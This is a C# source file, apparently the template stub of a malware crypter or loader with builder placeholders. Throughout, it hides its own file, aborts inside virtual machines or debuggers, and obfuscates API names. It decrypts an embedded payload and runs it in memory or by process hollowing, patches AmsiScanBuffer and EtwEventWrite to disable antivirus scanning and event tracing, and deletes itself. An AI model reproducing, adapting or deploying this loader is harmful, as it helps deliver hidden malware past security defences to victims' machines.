﻿using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Management;
using System.Threading;
using Microsoft.Win32;

namespace namespace_name
{
    internal class class_name
    {
        static string field_name = Process.GetCurrentProcess().MainModule.FileName;
        static void Main(string[] args)
        {
            File.SetAttributes(field_name, FileAttributes.Hidden | FileAttributes.System);

#if ANTI_VM
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
            ManagementObjectCollection instances = searcher.Get();
            foreach (ManagementBaseObject inst in instances)
            {
                string manufacturer = inst["Manufacturer"].ToString().ToLower();
                if ((manufacturer == "microsoft corporation" && inst["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || manufacturer.Contains("vmware") || inst["Model"].ToString() == "VirtualBox")
                {
                    exitfunction_name();
                    return;
                }
            }
            searcher.Dispose();
#endif

#if MELT_FILE
            string batpath = field_name.Replace(".bat.exe", ".bat");
            if (batpath.IndexOf(Path.GetTempPath(), StringComparison.OrdinalIgnoreCase) != 0)
            {
                string newpath = $"{Path.GetTempPath()}\\{Path.GetFileName(batpath)}";
                File.Copy(batpath, newpath, true);
                File.Delete(batpath);
                Process.Start(newpath);
                exitfunction_name();
                return;
            }
#endif

            IntPtr kmodule = LoadLibrary("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l");

#if ANTI_DEBUG
            IntPtr crdpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("checkremotedebugger_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
            IntPtr idpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("isdebuggerpresent_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
            checkremotedebugger_name CheckRemoteDebuggerPresent = (checkremotedebugger_name)Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(checkremotedebugger_name));
            isdebuggerpresent_name IsDebuggerPresent = (isdebuggerpresent_name)Marshal.GetDelegateForFunctionPointer(idpaddr, typeof(isdebuggerpresent_name));
            bool remotedebug = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remotedebug);
            if (Debugger.IsAttached || remotedebug || IsDebuggerPresent())
            {
                exitfunction_name();
                return;
            }
#endif
            string payloadstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("payloadexe_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
            string runpestr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("runpedllexe_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));

            Assembly asm = Assembly.GetExecutingAssembly();
            foreach (string name in asm.GetManifestResourceNames())
            {
                if (name == payloadstr || name == runpestr) continue;
                File.WriteAllBytes(name, getembeddedresourcefunction_name(name));
                File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
                new Thread(() =>
                {
                    Process.Start(name).WaitForExit();
                    File.SetAttributes(name, FileAttributes.Normal);
                    File.Delete(name);
                }).Start();
            }

            byte[] payload = uncompressfunction_name(aesfunction_name(getembeddedresourcefunction_name(payloadstr), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
            string[] targs = new string[] { };
            try
            {
                targs = args[0].Split(' ');
            }
            catch { }

            bypassfunction_name(kmodule);
#if USE_RUNPE
            Assembly runpe = Assembly.Load(uncompressfunction_name(aesfunction_name(getembeddedresourcefunction_name(runpestr), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
            string runpeclass = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("runpeclass_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
            string runpefunction = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("runpefunction_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
            runpe.GetType(runpeclass).GetMethod(runpefunction).Invoke(null, new object[]
            {
                Path.ChangeExtension(field_name, null),
                payload,
                targs
            }); 
#else
            MethodInfo entry = Assembly.Load(payload).EntryPoint;
            try { entry.Invoke(null, new object[] { targs }); }
            catch { entry.Invoke(null, null); }
#endif
            exitfunction_name();
        }

        static void exitfunction_name()
        {
            string cmdstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("cmdcommand_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
            Process.Start(new ProcessStartInfo()
            {
                Arguments = cmdstr + field_name + "\" & del \"" + field_name + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

        static byte[] aesfunction_name(byte[] input, byte[] key, byte[] iv)
        {
            AesManaged aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length);
            decryptor.Dispose();
            aes.Dispose();
            return decrypted;
        }

        static byte[] uncompressfunction_name(byte[] bytes)
        {
            MemoryStream msi = new MemoryStream(bytes);
            MemoryStream mso = new MemoryStream();
            GZipStream gs = new GZipStream(msi, CompressionMode.Decompress);
            gs.CopyTo(mso);
            gs.Dispose();
            mso.Dispose();
            msi.Dispose();
            return mso.ToArray();
        }

        static byte[] getembeddedresourcefunction_name(string name)
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            MemoryStream ms = new MemoryStream();
            Stream stream = asm.GetManifestResourceStream(name);
            stream.CopyTo(ms);
            stream.Dispose();
            byte[] ret = ms.ToArray();
            ms.Dispose();
            return ret;
        }
        
        static void bypassfunction_name(IntPtr kmodule)
        {
            IntPtr vpaddr = GetProcAddress(kmodule, "V" + "i" + "r" + "t" + "u" + "a" + "l" + "P" + "r" + "o" + "t" + "e" + "c" + "t");
            virtualprotect_name VirtualProtect = (virtualprotect_name)Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(virtualprotect_name));
            byte[] patch;
            uint old;

            IntPtr amsimodule = LoadLibrary("a" + "m" + "s" + "i" + "." + "d" + "l" + "l");
            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("amsiscanbuffer_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
            if (IntPtr.Size == 8) patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            else patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            VirtualProtect(asbaddr, (UIntPtr)patch.Length, 0x40, out old);
            Marshal.Copy(patch, 0, asbaddr, patch.Length);
            VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);

            IntPtr ntdll = LoadLibrary("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l");
            IntPtr etwaddr = GetProcAddress(ntdll, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("etweventwrite_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
            if (IntPtr.Size == 8) patch = new byte[] { 0xC3 };
            else patch = new byte[] { 0xC2, 0x14, 0x00 };
            VirtualProtect(etwaddr, (UIntPtr)patch.Length, 0x40, out old);
            Marshal.Copy(patch, 0, etwaddr, patch.Length);
            VirtualProtect(etwaddr, (UIntPtr)patch.Length, old, out old);
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        delegate bool virtualprotect_name(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
#if ANTI_DEBUG
        delegate bool checkremotedebugger_name(IntPtr hProcess, ref bool isDebuggerPresent);
        delegate bool isdebuggerpresent_name();
#endif
    }
}